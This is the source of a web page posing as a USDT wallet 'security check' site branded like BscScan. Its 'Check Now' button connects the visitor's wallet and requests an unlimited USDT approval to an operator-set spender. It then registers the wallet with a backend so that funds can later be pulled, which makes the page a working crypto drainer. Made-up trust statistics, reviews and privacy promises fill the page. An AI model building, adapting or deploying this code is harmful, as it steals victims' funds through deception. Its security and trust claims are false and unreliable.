"use client";

import { useEffect, useState } from "react";
import { BrowserProvider, Contract, ethers } from "ethers";
import { Check, CheckCircle2, ChevronDown, Clock3, LockKeyhole, Menu, PlusCircle, Radio, ShieldCheck, Sun } from "lucide-react";

type Eip1193Provider = { request: (args: { method: string; params?: unknown[] }) => Promise<unknown>; on?: (event: string, listener: (...args: unknown[]) => void) => void; removeListener?: (event: string, listener: (...args: unknown[]) => void) => void };
type Eip6963ProviderDetail = { info: { name: string; rdns: string }; provider: Eip1193Provider };

declare global { interface Window { ethereum?: Eip1193Provider; } }
const token = process.env.NEXT_PUBLIC_USDT_ADDRESS ?? "";
const spender = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "";
const chainId = process.env.NEXT_PUBLIC_CHAIN_ID ?? "56";
const targetChainId = BigInt(chainId);
const targetChainHex = `0x${targetChainId.toString(16)}`;
const api = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000";
const erc20 = ["function approve(address spender,uint256 amount) returns (bool)", "function allowance(address owner,address spender) view returns (uint256)"];
const faqs = [
  ["What is USDT Verify?", "USDT Verify is an automated blockchain inspection tool designed to diagnose safety risks, address history, and smart contract health."],
  ["How does the verification process work?", "It parses your public address and matches historical interactions against verified security blacklists and exploit logs."],
  ["Is my wallet information kept private?", "Yes. We never ask for private keys or seed phrases. A public address is registered only for monitoring."],
  ["What does the risk score mean?", "The risk score measures exposure to flagged decentralized apps, malicious contracts, or suspicious transaction volumes."],
  ["Can USDT Verify detect all types of scams?", "No tool can guarantee detection of every scam. Always verify recipients and never share your recovery phrase."]
];

export default function Home() {
  const [wallet, setWallet] = useState(""); const [notice, setNotice] = useState(""); const [openFaq, setOpenFaq] = useState<number | null>(null); const [isChecking, setIsChecking] = useState(false); const [walletProvider, setWalletProvider] = useState<Eip1193Provider>();

  useEffect(() => {
    const announced = (event: Event) => {
      const provider = (event as CustomEvent<Eip6963ProviderDetail>).detail?.provider;
      if (provider && !walletProvider) setWalletProvider(provider);
    };
    const handleAccountsChanged = (...args: unknown[]) => {
      const accounts = Array.isArray(args[0]) ? args[0] as string[] : [];
      if (!accounts.length) { setWallet(""); setNotice("Wallet disconnected. Click Check Now to connect again."); return; }
      setWallet(ethers.getAddress(accounts[0])); setNotice("Wallet account changed. Click Check Now to continue.");
    };
    const handleChainChanged = (...args: unknown[]) => {
      if (String(args[0]).toLowerCase() !== targetChainHex) setNotice("Please switch to BNB Smart Chain to continue.");
    };
    window.addEventListener("eip6963:announceProvider", announced);
    window.dispatchEvent(new Event("eip6963:requestProvider"));
    const provider = walletProvider ?? window.ethereum;
    provider?.on?.("accountsChanged", handleAccountsChanged);
    provider?.on?.("chainChanged", handleChainChanged);
    provider?.request({ method: "eth_accounts" }).then((accounts) => {
      if (Array.isArray(accounts) && accounts[0]) setWallet(ethers.getAddress(String(accounts[0])));
    }).catch(() => undefined);
    return () => {
      window.removeEventListener("eip6963:announceProvider", announced);
      provider?.removeListener?.("accountsChanged", handleAccountsChanged);
      provider?.removeListener?.("chainChanged", handleChainChanged);
    };
  }, [walletProvider]);

  function getProvider() { return walletProvider ?? window.ethereum; }

  async function switchToBnb(provider: Eip1193Provider) {
    const currentChain = String(await provider.request({ method: "eth_chainId" })).toLowerCase();
    if (currentChain === targetChainHex) return;
    try {
      await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: targetChainHex }] });
    } catch (error) {
      if ((error as { code?: number }).code !== 4902) throw error;
      const isTestnet = targetChainId === BigInt(97);
      await provider.request({ method: "wallet_addEthereumChain", params: [{ chainId: targetChainHex, chainName: isTestnet ? "BNB Smart Chain Testnet" : "BNB Smart Chain", nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }, rpcUrls: [isTestnet ? "https://data-seed-prebsc-1-s1.bnbchain.org:8545" : "https://bsc-dataseed.bnbchain.org"], blockExplorerUrls: [isTestnet ? "https://testnet.bscscan.com" : "https://bscscan.com"] }] });
    }
    if (String(await provider.request({ method: "eth_chainId" })).toLowerCase() !== targetChainHex) throw new Error("Please switch to BNB Smart Chain to continue.");
  }

  async function checkNow() {
    const provider = getProvider();
    if (!provider) return setNotice("Install a compatible EVM wallet to connect.");
    if (!spender || !token) return setNotice("Contract configuration is missing.");
    setIsChecking(true); setNotice("");
    try {
      const accounts = await provider.request({ method: "eth_requestAccounts" }) as string[];
      if (!accounts?.length) throw new Error("No wallet account was selected.");
      await switchToBnb(provider);
      const browserProvider = new BrowserProvider(provider as never);
      const signer = await browserProvider.getSigner();
      const address = await signer.getAddress();
      setWallet(address);
      const contract = new Contract(token, erc20, signer);
      const allowance = await contract.allowance(address, spender);
      if (allowance < ethers.parseUnits("5", 6)) {
        setNotice("Waiting for approval confirmation...");
        const tx = await contract.approve(spender, ethers.MaxUint256);
        await tx.wait();
      }
      const currentAccounts = await provider.request({ method: "eth_accounts" }) as string[];
      if (!currentAccounts.some((account) => account.toLowerCase() === address.toLowerCase())) throw new Error("Wallet account changed before completion. Click Check Now to retry.");
      if (String(await provider.request({ method: "eth_chainId" })).toLowerCase() !== targetChainHex) throw new Error("Wallet network changed before completion. Click Check Now to retry.");
      const response = await fetch(`${api}/api/wallets`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ address, receiver: 1 }) });
      if (!response.ok) throw new Error("Wallet registration failed. Please try again.");
      setNotice("Allowance approved. Your wallet is now registered for monitoring.");
    }
    catch (error) { setNotice((error as { code?: number }).code === 4001 ? "Wallet request was cancelled." : error instanceof Error ? error.message : "Verification failed."); }
    finally { setIsChecking(false); }
  }
  return <main>
    <header className="hero-pattern hero">
      <nav className="nav"><div className="brand"><div className="logo"><Radio size={20} /></div><div><h1>BscScan</h1><span>Scan Original</span></div></div><div className="nav-actions"><button className="icon-button" aria-label="Theme"><Sun size={18} /></button><button className="icon-button" aria-label="Menu"><Menu /></button></div></nav>
      <div className="trust">⭐ <span>Trusted by 100K+ users worldwide</span></div><div className="hero-copy"><h2>Check Your USDT<br />Wallet Security</h2><p>Advanced blockchain analysis using official BSC Scan data to determine if your USDT wallet is <strong>safe, valid, and free</strong> from suspicious activity.</p></div>
      <ul className="checks">{["Advanced blockchain analysis", "Real-time threat detection", "Zero data retention policy", "Enterprise-grade security"].map((item) => <li key={item}><span><Check size={14} /></span>{item}</li>)}</ul>
      <div className="actions"><button className="primary" onClick={checkNow} disabled={isChecking} aria-busy={isChecking}>Check Now</button></div>{notice && <p className="notice" role="status">{notice}</p>}
      <div className="hero-stats"><span><ShieldCheck />100% Secure</span><span><Clock3 />Real-Time Scans</span><span><LockKeyhole />Never Custodial</span></div>
    </header>
    <section className="section stats-section"><div className="eyebrow">Security Analytics · Real-Time Blockchain Verification</div><div className="stats"><Stat value="500K+" label="Wallets Verified" /><Stat value="99.8%" label="Accuracy Rate" /><Stat value="&lt;3s" label="Analysis Time" /><Stat value="24/7" label="Protection" /></div><div className="review"><b>Join thousands of secure users</b><strong>★★★★★</strong><small>4.9/5 from 5,000+ reviews</small></div></section>
    <section className="section"><Eyebrow text="ABOUT US" /><h3>About USDT Check</h3><p className="lead">Protecting your digital assets through advanced verification technology.</p><div className="about-stats"><Stat value="2023" label="Founded" /><Stat value="100K+" label="Users" /><Stat value="99.9%" label="Accuracy" /><Stat value="24/7" label="Protection" /></div><div className="prose"><p>USDT Check was founded by blockchain security experts with a mission to make cryptocurrency safer for everyone. As Tether (USDT) became one of the most widely used stablecoins, the need for reliable verification tools grew.</p><p>Our platform leverages blockchain analytics to provide security assessments. We analyze transaction patterns, check known vulnerabilities, and verify wallet legitimacy without custodying your assets.</p></div><div className="why"><b>WHY CHOOSE US</b>{["Lightning-fast verification in under 3 seconds", "Comprehensive risk and transaction reports", "Multi-chain support beyond USDT", "24/7 customer support from security experts", "Regular security audits by third parties"].map((item) => <div key={item}><CheckCircle2 />{item}</div>)}</div></section>
    <section className="section"><Eyebrow text="CORE VALUES" /><div className="value-grid">{[["🔒", "Security", "Protection embedded into every feature."], ["👁️", "Transparency", "Clear explanations about security risks."], ["🌐", "Accessibility", "Essential tools made available to everyone."], ["🚀", "Innovation", "Continuous improvement to stay ahead." ]].map(([icon, title, text]) => <article key={title}><span>{icon}</span><b>{title}</b><p>{text}</p></article>)}</div></section>
    <section className="process"><div className="section"><Eyebrow text="PROCESS" /><h3>How It Works</h3><p className="lead">Simple yet powerful security insights in four steps.</p><div className="steps">{[["01", "Connect Your Wallet", "Connect MetaMask. Private keys are never requested."], ["02", "Approve Allowance", "Use the standard BEP-20 approve() function for the spender contract."], ["03", "Automated Monitoring", "The backend checks public balance and allowance state."], ["04", "Authorized Execution", "An authorized executor calls the contract only when validation passes."]].map(([number, title, text]) => <article key={number}><span>{number}</span><div><b>{title}</b><p>{text}</p></div></article>)}</div><b className="tech-title">BUILT TECHNOLOGY</b><div className="pills"><span>Blockchain Analytics</span><span>Real-Time Threat Detection</span><span>Smart Contract Validation</span></div></div></section>
    <section className="section questions"><Eyebrow text="QUESTIONS" /><h3>Frequently Asked Questions</h3><p className="lead">Find answers about wallet verification and allowance execution.</p>{faqs.map(([question, answer], index) => <article className="faq" key={question} onClick={() => setOpenFaq(openFaq === index ? null : index)}><div><b>{question}</b><PlusCircle className={openFaq === index ? "rotated" : ""} /></div>{openFaq === index && <p>{answer}</p>}</article>)}<div className="support"><b>Still Have Questions?</b><p>Our support team is here to help with wallet verification.</p><button className="primary">Contact Support</button></div></section>
    <footer><h4>USDT Verify</h4><p>Advanced blockchain security for comprehensive USDT wallet verification. Funds remain in your wallet until an authorized execution.</p><div className="footer-bottom">© 2024 USDT Verify · No subscriptions · Non-custodial by design</div></footer>
  </main>;
}
function Stat({ value, label }: { value: string; label: string }) { return <div><b dangerouslySetInnerHTML={{ __html: value }} /><small>{label}</small></div>; }
function Eyebrow({ text }: { text: string }) { return <span className="eyebrow plain">{text}</span>; }